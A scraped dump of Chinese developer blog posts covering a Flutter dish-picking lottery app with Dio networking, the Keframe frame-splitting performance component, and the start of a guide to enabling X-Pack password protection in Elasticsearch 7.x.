static Global? getInstance() { if (_instance == null) _instance = Global(); return _instance; } Global() { dio = Dio(); dio.options = BaseOptions( baseUrl: BaseUrl, connectTimeout: timeOut, sendTimeout: timeOut, receiveTimeout: timeOut, contentType: Headers.jsonContentType, headers: { &quot;Access-Control-Allow-Origin&quot;: &quot;*&quot;, }); // 请求拦截器 and 响应拦截机 and 错误处理 dio.interceptors.add(InterceptorsWrapper(onRequest: (options, handler) { print(&quot;\\n================== 请求数据 ==========================&quot;); print(&quot;url = ${options.uri.toString()}&quot;); print(&quot;headers = ${options.headers}&quot;); print(&quot;params = ${options.data}&quot;); print(&quot;\\n================== 请求数据 ==========================&quot;); return handler.next(options); }, onResponse: (response, handler) { print(&quot;\\n================== 响应数据 ==========================&quot;); print(&quot;code = ${response.statusCode}&quot;); print(&quot;data = ${response.data}&quot;); print(&quot;\\n================== 响应数据 ==========================&quot;); handler.next(response); }, onError: (DioError e, handler) { print(&quot;\\n================== 错误响应数据 ======================&quot;); print(&quot;type = ${e.type}&quot;); print(&quot;message = ${e.message}&quot;); print(&quot;\\n================== 错误响应数据 ======================&quot;); return handler.next(e); })); }} # routes.dart 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// ignore_for_file: prefer_const_constructorsimport 'package:flutter/cupertino.dart';import 'package:weat/views/index/IndexView.dart';Map&lt;String, WidgetBuilder&gt; routes = { &quot;/&quot;: (context) =&gt; IndexView(),};/* * 渐隐跳转路由 */void opcityPush(BuildContext context, Widget view, {int? milliseconds}) { Navigator.push( context, PageRouteBuilder( transitionDuration: Duration(milliseconds: milliseconds ?? 300), //动画时间为300毫秒 pageBuilder: (BuildContext context, Animation&lt;double&gt; animation, Animation secondaryAnimation) { return FadeTransition( //使用渐隐渐入过渡, opacity: animation, child: view, //路由B ); }, ), );}/* * 带路由树跳转 */void Push(BuildContext context, Widget view) { Navigator.push( context, CupertinoPageRoute( builder: (context) =&gt; view, ));}void NavigatorPop(BuildContext context) { Navigator.of(context).pop();}/* * 返回上一级路由树，没有上级会黑屏 */void Pop(BuildContext context, Widget view) { Navigator.pop( context, CupertinoPageRoute( builder: (context) =&gt; view, ));} # showmessage_util.dart 12345678910111213141516171819202122232425262728293031// ignore_for_file: prefer_equal_for_default_values, sized_box_for_whitespaceimport 'package:flutter/material.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';import 'package:fluttertoast/fluttertoast.dart';/// @author brath/// @创建时间：2022/5/10/// 封装自定义弹框class DialogUtils { /// 显示普通消息 static showMessage(String msg, {toastLength: Toast.LENGTH_LONG, gravity: ToastGravity.CENTER, timeInSecForIosWeb: 2, textColor: Colors.black, backgroundColor: Colors.grey, fontSize: 16.0}) { // 先关闭弹框再显示对应弹框 Fluttertoast.cancel(); Fluttertoast.showToast( msg: msg, toastLength: toastLength, webShowClose: true, gravity: gravity, textColor: textColor, timeInSecForIosWeb: timeInSecForIosWeb, backgroundColor: Colors.grey[50], fontSize: 13.0.sp, ); } # index_viewmodel.dart 1234567891011121314151617181920212223242526import 'package:dio/dio.dart';import 'package:flutter/material.dart';class IndexViewModel extends ChangeNotifier { bool? isLotte = false; Map? currentDishes = {}; bool? get getIsLotte { return isLotte; } void setIsLotte(bool isLotte) { this.isLotte = isLotte; notifyListeners(); } Map? get getCurrentDishes { return currentDishes; } void setCurrentDishes(Map currentDishes) { this.currentDishes = currentDishes; notifyListeners(); }} # IndexView.dart 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559import 'dart:math';import 'package:flutter/material.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';import 'package:getwidget/getwidget.dart';import 'package:provider/provider.dart';import 'package:weat/common/ZoomImage.dart';import 'package:weat/core/Global.dart';import 'package:weat/routers/routes.dart';import 'package:weat/utils/showmessage_util.dart';import 'package:weat/viewmodel/index_viewmodel.dart';import 'package:weat/views/index/DishesDetail.dart';/* * 首页视图 */class IndexView extends StatefulWidget { const IndexView({Key? key}) : super(key: key); @override State&lt;IndexView&gt; createState() =&gt; _IndexViewState();}class _IndexViewState extends State&lt;IndexView&gt; { @override Widget build(BuildContext context) { return const LotterView(); }}/* * 轮播抽奖页面 */class LotterView extends StatefulWidget { const LotterView({Key? key}) : super(key: key); @override State&lt;LotterView&gt; createState() =&gt; _LotterViewState();}class _LotterViewState extends State&lt;LotterView&gt; { //抽奖控制器 final SimpleLotteryController _simpleLotteryController = SimpleLotteryController(); int page = 1; int size = 8; //奖品列表 List dishesList = []; //奖品loding bool load = false; //初始化奖品列表 _initPrizeList() async { Global.getInstance()!.dio.get(&quot;dishes/getDishes&quot;, queryParameters: { 'page': 1, 'size': 8, }).then((value) =&gt; { dishesList = value.data['data']['prizeRecords'], load = true, setState(() {}) }); } @override void initState() { super.initState(); _initPrizeList(); } @override void dispose() { _simpleLotteryController.dispose(); super.dispose(); } @override Widget build(BuildContext context) { return Scaffold( body: MediaQuery.removePadding( removeTop: true, context: context, child: ListView( children: [ Container( width: MediaQuery.of(context).size.width, height: MediaQuery.of(context).size.height, decoration: BoxDecoration( gradient: LinearGradient( begin: Alignment.topLeft, //左中 end: Alignment.bottomRight, //右中 colors: [ Theme.of(context).primaryColor, const Color.fromRGBO(180, 0, 0, 0.1), const Color.fromRGBO(187, 0, 0, 0.1), Theme.of(context).primaryColor ]), ), child: Column( children: [ Container( padding: EdgeInsets.only(top: 50.h), child: Wrap( children: [ Text('今日菜品', style: TextStyle( fontSize: 32.sp, fontWeight: FontWeight.w600, fontFamily: 'jinbu', color: Colors.white, )), Text( '大放送', style: TextStyle( fontSize: 32.sp, fontWeight: FontWeight.w600, fontFamily: 'jinbu', color: const Color.fromARGB(255, 252, 217, 61)), ) ], ), ), Container( margin: EdgeInsets.only(top: 10.h), alignment: Alignment.center, child: Text( '猜猜今天是什么菜系？', style: TextStyle( fontSize: 12.sp, color: Colors.white, fontFamily: 'jinbu', ), ), ), SizedBox( height: 10.h, ), Padding( padding: EdgeInsets.all(12.0.sp), child: Container( height: 400.h, padding: EdgeInsets.all(14.sp), decoration: BoxDecoration( gradient: LinearGradient( begin: Alignment.topLeft, //左中 end: Alignment.bottomRight, //右中 colors: [ Theme.of(context).primaryColor, const Color.fromRGBO(180, 0, 0, 0.1), const Color.fromRGBO(187, 0, 0, 0.1), Theme.of(context).primaryColor ]), // color: const Color.fromARGB(255, 205, 221, 235), border: Border.all( color: Colors.transparent, width: 14.w), borderRadius: BorderRadius.all(Radius.elliptical(20.r, 20.r))), child: Column( mainAxisAlignment: MainAxisAlignment.center, children: [ load ? SimpleLotteryWidget( dishesList: dishesList, simpleLotteryController: _simpleLotteryController) : SizedBox( width: double.infinity, height: 260.h, child: const GFLoader( type: GFLoaderType.ios, loaderColorOne: Colors.blue, loaderColorTwo: Colors.blue, loaderColorThree: Colors.blue, duration: Duration(milliseconds: 300)), ), //抽奖按钮 AnimatedSwitcher( duration: const Duration(milliseconds: 400), child: Provider.of&lt;IndexViewModel&gt;(context, listen: true) .getIsLotte! ? SizedBox( height: 34.h, width: MediaQuery.of(context).size.width - 120.w, child: ElevatedButton( style: ElevatedButton.styleFrom( primary: Colors.red[200], //chan onPrimary: Colors .white, //change text color of button shape: RoundedRectangleBorder( borderRadius: BorderRadius.circular(30.r), ), elevation: 3.0.h, ), onPressed: () { //跳转详情页面 Push( context, DishesDetailView( dishes: Provider.of&lt;IndexViewModel&gt;( context, listen: false) .getCurrentDishes)); //设置状态 Provider.of&lt;IndexViewModel&gt;(context, listen: false) .setIsLotte(false); }, child: Row( mainAxisAlignment: MainAxisAlignment.center, children: [ SizedBox( width: 4.w, ), Text( '点击查看：${Provider.of&lt;IndexViewModel&gt;(context, listen: false).getCurrentDishes!['dishesName']}', style: TextStyle( fontWeight: FontWeight.w500, fontFamily: '', color: Colors.white, fontSize: 14.0.sp), ), ], ), )) : SizedBox( height: 34.h, width: MediaQuery.of(context).size.width - 220.w, child: ElevatedButton( style: ElevatedButton.styleFrom( primary: Colors.red[200], //chan onPrimary: Colors .white, //change text color of button shape: RoundedRectangleBorder( borderRadius: BorderRadius.circular(30.r), ), elevation: 3.0.h, ), onPressed: () { //开始抽奖 _simpleLotteryController.start( Random.secure().nextInt(2)); //开启 setState(() {}); }, child: Row( mainAxisAlignment: MainAxisAlignment.center, children: [ SizedBox( width: 4.w, ), Text( '吃啥', style: TextStyle( fontWeight: FontWeight.w500, fontFamily: '', color: Colors.white, fontSize: 14.0.sp), ), ], ), )), ) ], ), ), ), ], ), ), ], ), ), ); }}//奖品参数class SimpleLotteryValue { SimpleLotteryValue( {this.target = 0, this.isFinish = false, this.isPlaying = false}); /// 中奖目标 int target = 0; bool isPlaying = false; bool isFinish = false; SimpleLotteryValue copyWith({ int target = 0, bool isPlaying = false, bool isFinish = false, }) { return SimpleLotteryValue( target: target, isFinish: isFinish, isPlaying: isPlaying); } @override String toString() { return &quot;target : $target , isPlaying : $isPlaying , isFinish : $isFinish&quot;; }}//抽奖控制器class SimpleLotteryController extends ValueNotifier { SimpleLotteryController() : super(SimpleLotteryValue()); /// 开启抽奖 /// /// [target] 中奖目标 void start(int target) { // 九宫格抽奖里范围为0~8 assert(target &gt;= 0 &amp;&amp; target &lt;= 8); if (value.isPlaying) { return; } value = value.copyWith(target: target, isPlaying: true); } void finish() { value = value.copyWith(isFinish: true); }}/* * 奖品列表容器 */class SimpleLotteryWidget extends StatefulWidget { final SimpleLotteryController simpleLotteryController; final List dishesList; const SimpleLotteryWidget( {Key? key, required this.dishesList, required this.simpleLotteryController}) : super(key: key); @override State&lt;SimpleLotteryWidget&gt; createState() =&gt; _SimpleLotteryWidgetState();}class _SimpleLotteryWidgetState extends State&lt;SimpleLotteryWidget&gt; with TickerProviderStateMixin { Future&lt;int&gt;? future; // 标识 @override Widget build(BuildContext context) { return FutureBuilder( future: future, builder: (context, snapshot) { return Container( margin: EdgeInsets.all(5.h), width: double.infinity, height: 280.h, child: GridView.builder( physics: const NeverScrollableScrollPhysics(), itemCount: 9, gridDelegate: SliverGridDelegateWithFixedCrossAxisCount( crossAxisCount: 3, crossAxisSpacing: 8.w, mainAxisSpacing: 8.h), itemBuilder: (context, index) { if (index != 4) { return commodity(index); } return Image.network( 'https://brath.cloud/app_log.png', fit: BoxFit.cover, ); })); }, ); } // 奖品列表 Widget commodity(int index) { final int toIndex; toIndex = _deserializeMap[index]; return GestureDetector( onTap: () { opcityPush(context, ZoomImage(url: '${widget.dishesList[toIndex]['dishesUrl']}')); }, child: Stack( children: [ Container( decoration: BoxDecoration( borderRadius: BorderRadius.all(Radius.circular(10.r)), color: widget.dishesList[toIndex]['id']! &gt; 5 ? Colors.red[300]!.withAlpha(32) : widget.dishesList[toIndex]['id']! &gt;= 4 &amp;&amp; widget.dishesList[toIndex]['id'] &lt;= 5 ? Colors.amber[300]!.withAlpha(32) : Colors.blue[300]!.withAlpha(32), ), child: SizedBox( width: double.infinity, height: double.infinity, child: Column( mainAxisAlignment: MainAxisAlignment.center, children: [ Image.network( '${widget.dishesList[toIndex]['dishesUrl']}', fit: BoxFit.cover, width: 60.w, height: 60.w, ), SizedBox( height: 5.h, ), Text( '${widget.dishesList[toIndex]['dishesName']}', maxLines: 1, overflow: TextOverflow.ellipsis, style: TextStyle( fontFamily: 'jinbu', fontSize: 9.sp, color: Theme.of(context).primaryColor, ), ), ], ), ), ), Container( decoration: BoxDecoration( color: index == _currentSelect ? Colors.yellow.withOpacity(0.5) : Colors.transparent, borderRadius: BorderRadius.all(Radius.circular(10.r)), )), ], ), ); } Animation? _selectedIndexTween; AnimationController? _startAnimateController; int _currentSelect = -1; int _target = 0; /// 旋转的圈数 final int repeatRound = 4; VoidCallback? _listener; /// 选中下标的映射 final Map _selectMap = {0: 0, 1: 3, 2: 6, 3: 7, 4: 8, 5: 5, 6: 2, 7: 1}; //反下标的映射 final Map _deserializeMap = { 0: 0, 3: 1, 4: 8, 6: 2, 7: 3, 8: 4, 5: 5, 2: 6, 1: 7 }; simpleLotteryWidgetState() { _listener = () { // 开启抽奖动画 if (widget.simpleLotteryController.value.isPlaying) { _startAnimateController?.reset(); _target = widget.simpleLotteryController.value.target; _selectedIndexTween = _initSelectIndexTween(_target); _startAnimateController?.forward(); } }; } /// 初始化tween /// /// [target] 中奖的目标 Animation _initSelectIndexTween(int target) =&gt; StepTween(begin: 0, end: repeatRound * 8 + target).animate( CurvedAnimation( parent: _startAnimateController!, curve: Curves.easeOutQuart)); @override void initState() { super.initState(); future = Future.value(42); _startAnimateController = AnimationController(vsync: this, duration: const Duration(seconds: 5)); _selectedIndexTween = _initSelectIndexTween(_target); //开启动画 simpleLotteryWidgetState(); // 控制监听 widget.simpleLotteryController.addListener(_listener!); // 动画监听 _startAnimateController?.addListener(() { // 更新选中的下标 _currentSelect = _selectMap[_selectedIndexTween?.value % 8]; if (_startAnimateController!.isCompleted) { widget.simpleLotteryController.finish(); _currentSelect = -1; dynamic dishes = widget.dishesList[_target]; Provider.of&lt;IndexViewModel&gt;(context, listen: false).setIsLotte(true); Provider.of&lt;IndexViewModel&gt;(context, listen: false) .setCurrentDishes(dishes); DialogUtils.showMessage('恭喜你，今天做：${dishes['dishesName']}，点击按钮查看菜品做法！'); } setState(() {}); }); } @override void deactivate() { widget.simpleLotteryController.removeListener(_listener!); super.deactivate(); } @override void dispose() { _startAnimateController?.dispose(); super.dispose(); }}//获取当前奖品出现的次数getNumberTimesCurrentPrizeAppears(String? id, List&lt;dynamic&gt; arr) { //定义集合 Map obj = {}; List idList = []; for (var i = 0; i &lt; arr.length; i++) { idList.add(arr[i]['id']); } for (var i = 0; i &lt; idList.length; i++) { if (obj.containsValue([idList[i]])) { obj[idList[i]]++; } else { obj[idList[i]] = 1; } } return obj[int.parse(id!)];}int next(int min, int max) { int res = min + Random().nextInt(max - min + 1); return res;} # DishesDetail.dart 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140import 'package:bruno/bruno.dart';import 'package:flutter/material.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';import 'package:flutter_swiper_plus/flutter_swiper_plus.dart';import 'package:weat/common/common.dart';class DishesDetailView extends StatefulWidget { DishesDetailView({Key? key,required this.dishes}) : super(key: key); var dishes; @override State&lt;DishesDetailView&gt; createState() =&gt; _DishesDetailViewState();}class _DishesDetailViewState extends State&lt;DishesDetailView&gt; { List steplist = []; @override void initState() { super.initState(); //分割步骤 steplist = widget.dishes['dishesStep'].toString().split('\\r\\n'); } @override Widget build(BuildContext context) { return WillPopScope( onWillPop: () { BrnDialogManager.showConfirmDialog(context, showIcon: false, barrierDismissible: false, title: &quot;你正在做菜，要退出吗~&quot;, confirm: &quot;退出&quot;, cancel: &quot;不&quot;, onConfirm: () { Navigator.of(context).pop(); Navigator.of(context).pop(); }, onCancel: () { Navigator.of(context).pop(); }); return Future.value(false); }, child: Scaffold( appBar: getAppBar(widget.dishes['dishesName'], context: context), body: ListView( children: [ Padding( padding: const EdgeInsets.all(8.0), child: ImageFulWidget(imageList: [widget.dishes['dishesUrl']]), ), getCardContainer( margin: EdgeInsets.only( top: 10.h, bottom: 10.h, left: 10.w, right: 10.w), height: 220.0.h, isBorder: true, BorderCircular: 5.r, width: double.infinity, widget: Column( crossAxisAlignment: CrossAxisAlignment.start, children: [ Padding( padding: EdgeInsets.only(left: 10.w, top: 10.h), child: BrnCSS2Text.toTextView( '步骤：', maxLines: 1, textOverflow: TextOverflow.ellipsis, defaultStyle: TextStyle(fontSize: 20.sp, fontFamily: 'jinbu'), ), ), Padding( padding: EdgeInsets.only(left: 10.w, top: 10.h), child: Column( crossAxisAlignment: CrossAxisAlignment.start, children: steplist.map((e) { return Container( margin: EdgeInsets.only(top: 5.h), child: BrnCSS2Text.toTextView( '$e', maxLines: 1, textOverflow: TextOverflow.ellipsis, defaultStyle: TextStyle( fontSize: 13.sp, fontFamily: 'jinbu'), ), ); }).toList(), ), ), ], ), ) ], )), ); }}/* * 顶部轮播图Widget */class ImageFulWidget extends StatelessWidget { ImageFulWidget({ Key? key, required this.imageList, }) : super(key: key); List&lt;String&gt;? imageList; @override Widget build(BuildContext context) { return ClipRRect( borderRadius: BorderRadius.vertical( top: Radius.circular(20.h), bottom: Radius.circular(20.h)), child: SizedBox( height: MediaQuery.of(context).size.height * 0.25, width: MediaQuery.of(context).size.width - 60.0.w, child: Swiper( autoplay: false, duration: 2000, curve: Curves.linearToEaseOut, itemBuilder: (BuildContext context, int index) { return Image.network( imageList![index], height: MediaQuery.of(context).size.height * 0.25, width: MediaQuery.of(context).size.width - 60.0.w, fit: BoxFit.cover, ); }, itemCount: imageList!.length, pagination: SwiperPagination( builder: DotSwiperPaginationBuilder( size: 8.sp, // 设置未选中的小点大小 activeSize: 10.sp, // 设置选中的小点大小 color: const Color.fromARGB(255, 219, 219, 219), // 设置为未选中的小点颜色 activeColor: Colors.blue, // 设置选中的小点颜色 ), ), control: const SwiperControl(color: Colors.transparent), ), ), ); }} # main.dart 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128import 'dart:async';import 'dart:io';import 'dart:math';import 'package:flutter/material.dart';import 'package:flutter/physics.dart';import 'package:flutter/services.dart';import 'package:flutter_easyloading/flutter_easyloading.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';import 'package:get/get_navigation/src/root/get_material_app.dart';import 'package:intl/date_symbol_data_local.dart';import 'package:provider/provider.dart';import 'package:weat/routers/routes.dart';import 'package:weat/viewmodel/index_viewmodel.dart';//全局路由keyfinal GlobalKey&lt;NavigatorState&gt; navigatorKey = GlobalKey&lt;NavigatorState&gt;();/* * 主函数 */void main() async { initializeDateFormatting().then((_) =&gt; runApp(MultiProvider( providers: [ ChangeNotifierProvider(create: (context) =&gt; IndexViewModel()), ], child: MyApp(), ))); //安卓屏蔽顶部阴影 if (Platform.isAndroid) { SystemUiOverlayStyle systemUiOverlayStyle = SystemUiOverlayStyle(statusBarColor: Colors.transparent); SystemChrome.setSystemUIOverlayStyle(systemUiOverlayStyle); }}//根节点class MyApp extends StatefulWidget { @override State&lt;MyApp&gt; createState() =&gt; _MyAppState();}class _MyAppState extends State&lt;MyApp&gt; { @override void initState() { super.initState(); _init(); }//全局路由key final GlobalKey&lt;NavigatorState&gt; navigatorKey = GlobalKey&lt;NavigatorState&gt;(); /// 程序初始化 _init() async { await EasyLoading.init(); EasyLoading.instance ..displayDuration = const Duration(milliseconds: 2000) ..indicatorType = EasyLoadingIndicatorType.fadingCircle ..loadingStyle = EasyLoadingStyle.dark ..indicatorSize = 45.0 ..radius = 10.0 ..progressColor = Colors.yellow ..backgroundColor = Colors.green ..indicatorColor = Colors.yellow ..textColor = Colors.yellow ..maskColor = Colors.blue.withOpacity(0.5) ..userInteractions = true ..dismissOnTap = false; await WidgetsFlutterBinding.ensureInitialized(); await SystemChrome.setPreferredOrientations( [ // 竖屏 Portrait 模式 DeviceOrientation.portraitUp, DeviceOrientation.portraitDown, ], ); } @override Widget build(BuildContext context) { return ScreenUtilInit( designSize: Size(375, 667), minTextAdapt: true, splitScreenMode: true, builder: (context, child) { return GetMaterialApp( theme: ThemeData( primarySwatch: Colors.blueGrey, //全局主题颜色 splashColor: Colors.transparent, // 点击时的高亮效果设置为透明 // backgroundColor: Color.fromARGB(255, 255, 255, 255), //系统背景主题颜色 backgroundColor: Color(0xFFF3F4F6), //系统背景主题颜色 highlightColor: Colors.transparent, // 长按时的扩散效果设置为透明 primaryColor: Color.fromARGB(188, 0, 0, 97), //系统原色 focusColor: Color.fromARGB(235, 73, 74, 116), //焦点主题颜色 hoverColor: Color.fromARGB(235, 103, 104, 172), //悬停主题颜色 disabledColor: Color.fromARGB(235, 105, 106, 133), //禁用主题颜色 primaryColorLight: Colors.white, // 白色主题颜色 primaryColorDark: Color.fromARGB(235, 73, 74, 116), //黑色主题颜色 selectedRowColor: Color.fromARGB(255, 104, 80, 145), //选中效果颜色 appBarTheme: AppBarTheme(backgroundColor: Colors.white), buttonTheme: ButtonThemeData( focusColor: Color.fromARGB(235, 73, 74, 116), hoverColor: Color.fromARGB(235, 103, 104, 172), ), tabBarTheme: TabBarTheme( labelColor: Color.fromARGB(235, 103, 104, 172), ), progressIndicatorTheme: ProgressIndicatorThemeData( color: Color.fromARGB(235, 101, 102, 158), ), ), navigatorKey: navigatorKey, routes: routes, debugShowCheckedModeBanner: false, initialRoute: &quot;/&quot;, //初始化进入加载页面 builder: (context, widget) { return MediaQuery( data: MediaQuery.of(context).copyWith(textScaleFactor: 1.0), child: widget!, ); }, ); }); }} # 代码编写完毕后 flutter build apk 打包到真机运行 # 最终呈现出我们想要的效果： 抽奖中： 中奖： 详情： # 本期教程到此结束，欢迎你的观看～ # 微信公众号搜索 InterviewCoder 回复关键词《吃啥》获取源码以及开发教程～ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/22/%E3%80%90Flutter&SpringBoot%E3%80%91%E5%A6%82%E4%BD%95%E7%94%A8Flutter%E5%92%8CJava%E6%9D%A5%E5%BC%80%E5%8F%91%E4%B8%80%E4%B8%AA%E6%8A%BD%E5%A5%96APP/"},{"title":"Flutter 流畅度优化组件 Keframe","text":"最近在开发一款 APP，核心场景类似于帖子这类的，所以下拉加载页面的流畅度成为最棘手的问题，在掘金上看见了这篇文章： https://juejin.cn/post/6979781997568884766 Nayuta 的 Keframe 组件正好可以满足帧率优化的问题 # 项目依赖： 在 pubspec.yaml 中添加 keframe 依赖 12dependencies: keframe: version 组件仅区分非空安全与空安全版本 非空安全使用： 1.0.2 空安全版本使用： 2.0.2 github 地址：github.com/LianjiaTech… pub 查看：pub.dev/packages/ke… 1234567891011121314151617#SizeCacheWidget用来包裹最外层的list#FrameSeparateWidget用来包裹list的子集即可 example:SizeCacheWidget( child：ListView || CustomScrollView( slivers[ SliverList( delegate: SliverChildBuilderDelegate (BuildContext context, int index){ return FrameSeparateWidget( child: ··· ) } ) ] )) # 快速上手： 如下图所示 假如现在页面由 A、B、C、D 四部分组成，每部分耗时 10ms，在页面时构建为 40ms。使用分帧组件 FrameSeparateWidget 嵌套每一个部分。页面构建时会在第一帧渲染简单的占位，在后续四帧内分别渲染 A、B、C、D。 对于列表，在每一个 item 中嵌套 FrameSeparateWidget ，并将 ListView 嵌套在 SizeCacheWidget 内即可。 # 构造函数说明 FrameSeparateWidget ：分帧组件，将嵌套的 widget 单独一帧渲染 类型 参数名 是否必填 含义 Key key 否 int index 否 分帧组件 id，使用 SizeCacheWidget 的场景必传，SizeCacheWidget 中维护了 index 对应的 Size 信息 Widget child 是 实际需要渲染的 widget Widget placeHolder 否 占位 widget，尽量设置简单的占位，不传默认是 Container () SizeCacheWidget：缓存子节点中，分帧组件嵌套的实际 widget 的尺寸信息 类型 参数名 是否必填 含义 Key key 否 Widget child 是 子节点中如果包含分帧组件，则缓存实际的 widget 尺寸 int estimateCount 否 预估屏幕上子节点的数量，提高快速滚动时的响应速度 # 方案设计与分析： 卡顿的本质，就是 单帧的绘制时间过长。基于此自然衍生出两种思路解决： 1、减少一帧的绘制耗时，因为导致耗时过长的原因有很多，比如不合理的刷新，或者绘制时间过长，都有可能，需要具体问题具体分析，后面我会分享一些我的优化经验。 2、在不对耗时优化下，将一帧的任务拆分到多帧内，保证每一帧都不超时。这也是本组件的设计思路，分帧渲染。 如下图所示: 原理并不复杂，问题在于如何在 Flutter 中实践这一机制。 因为涉及到帧与系统的调度，自然联想到看 SchedulerBinding 中有无现成的 API。 发现了 scheduleTask 方法，这是系统提供的一个执行任务的方法，但这个方法存在两个问题： 1、其中的渲染任务是优先级进行堆排序，而堆排序是不稳定排序，这会导致任务的执行顺序并非 FIFO。从效果上来看，就是列表不会按照顺序渲染，而是会出现跳动渲染的情况 2、这个方法本身存在调度问题，我已经提交 issue 与 pr，不过一直卡在单元测试上，如果感兴趣可以以在这里交流谈论。 fix: Tasks scheduled through ‘SchedulerBinding.instance.scheduleTask’… #82781 最终，参考这个设计结合 endOfFrame 方法的使用，完成了分帧队列。整个渲染流程变为下图所示： 对于列表构建场景来说，假设屏幕上能显示五个 item。首先在第一帧的时候，列表会渲染 5 个占位的 Widget，同时添加 5 个高优先级任务到队列中，这里的任务可以是简单的将占位 Widget 和实际 item 进行替换，也可通过渐变等动画提升体验。在后续的五帧中占位 Widget 依次被替换成实际的列表 item。 在 ListView 流畅度翻倍！！Flutter 卡顿分析和通用优化方案 这篇文章中有更加详细的分析。 # 一些展示效果（Example 说明请查看 Github） 卡顿的页面往往都是由多个复杂 widget 同时渲染导致。通过为复杂的 widget 嵌套分帧组件 FrameSeparateWidget 。渲染时，分帧组件会在第一帧同时渲染多个 palceHolder ，之后连续的多帧内依次渲染复杂子项，以此提升页面流畅度。 例如 example 中的优化前示例： 12345678ListView.builder( itemCount: childCount, itemBuilder: (c, i) =&gt; CellWidget( color: i % 2 == 0 ? Colors.red : Colors.blue, index: i, ), )复制代码 其中 CellWidget 高度为 60，内部嵌套了三个 TextField 的组件（整体构建耗时在 9ms 左右）。 优化仅需为每一个 item 嵌套分帧组件，并为其设置 placeHolder （placeHolder 尽量简单，样式与实际 item 接近即可）。 在列表情况下，给 ListView 嵌套 SizeCacheWidget ，同时建议将预加载范围 cacheExtent 设置大一点，例如 500（该属性默认为 250），提升慢速滑动时候的体验。 (占位与实际列表项不一致时，首次渲染抖动，二次渲染正常) 此外，也可以给 item 嵌套透明度 / 位移等动画，优化视觉上的效果。 效果如下图： # 分帧的成本 当然分帧方案也非十全十美，在我看来主要有两点成本： 1、额外的构建开销：整个构建过程的构建消耗由「n * widget 消耗 」变成了「n *（ widget + 占位）消耗 + 系统调度 n 帧消耗」。可以看出，额外的开销主要由占位的复杂度决定。如果占位只是简单的 Container，测试后发现整体构建耗时大概提升在 15 % 左右。这种额外开销对于当下的移动设备而言，成本几乎可以不计。 2、视觉上的变化：如同上面的演示，组件会将 item 分帧渲染，页面在视觉上出现占位变成实际 widget 的过程。但其实由于列表存在缓存区域（建议将缓存区调大），在高端机或正常滑动情况下用户并无感知。而在中低端设备上快速滑动能感觉到切换的过程，但比严重顿挫要好。 # 优化前后对比演示 注：gif 帧率只有 20 优化前 优化后 # 最后：一点点思考 列表优化篇到此告一段落，在整个开源实践过程中，有两点感触较深： 作者：Nayuta 链接：https://juejin.cn/post/6979781997568884766 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/04/12/%E3%80%90Flutter%E3%80%91Flutter%20%E6%B5%81%E7%95%85%E5%BA%A6%E4%BC%98%E5%8C%96%E7%BB%84%E4%BB%B6%20Keframe/"},{"title":"ELASTICSEARCH7.X安全性之访问密码设置","text":"# ELASTICSEARCH7.X 安全性之访问密码设置 1当我们安装完ElasticSearch的时候发现，访问过程中我们没有任何安全认证就可以直接访问并操作。如果是生产环境，端口向外暴露的话，那么对数据的安全性是无法得到保障的。 一般解决方案有 开启 ElasticSearch 认证插件，访问的时候添加账密 当然也可以通过 nginx 作代理防护 本文主要讲解通过启用 X-Pack 来设置 ElasticSearch 的访问密码。 集群与单据环境都适合次方法 集群与单据环境配置的区别就是，集群需要在某一台生成证书然后拷贝到其它节点目录下。 集群环境重设置密码的时候需要整个集群节点都已启动，可在任一台处修改。 # 2.X-PACK 简介 12X-Pack是Elastic Stack扩展功能，提供安全性，警报，监视，报告，机器学习和许多其他功能。 ES7.0+之后，默认情况下，当安装Elasticsearch时，会自动安装X-Pack，无需单独再安装。自6.8以及7.1+版本之后，基础级安全永久免费了。在使用的时候主要需要配置一下证书，以及修改配置文件（config/elasticsearch.yml ） # 3. 证书配置 # 3.1 生成节点证书 切换到 elasticsearch 安装文件目录 bin 下 ：示例：/usr/local/elasticsearch-7.4.0/bin 借助 elasticsearch-certutil 命令生成证书： 1./elasticsearch-certutil ca -out config/certs/elastic-certificates.p12 -pass 这里单独设置了一个 证书文件目录 config/certs 生成后的证书 # 3.2 修改配置 配置通信证书 &gt; 需要在 config 目前下 elasticsearch.yml 配置 123456789# 开启xpackxpack.security.enabled: truexpack.license.self_generated.type: basicxpack.security.transport.ssl.enabled: true# 证书配置xpack.security.transport.ssl.verification_mode: certificatexpack.security.transport.ssl.keystore.path: certs/elastic-certificates.p12xpack.security.transport.ssl.truststore.path: 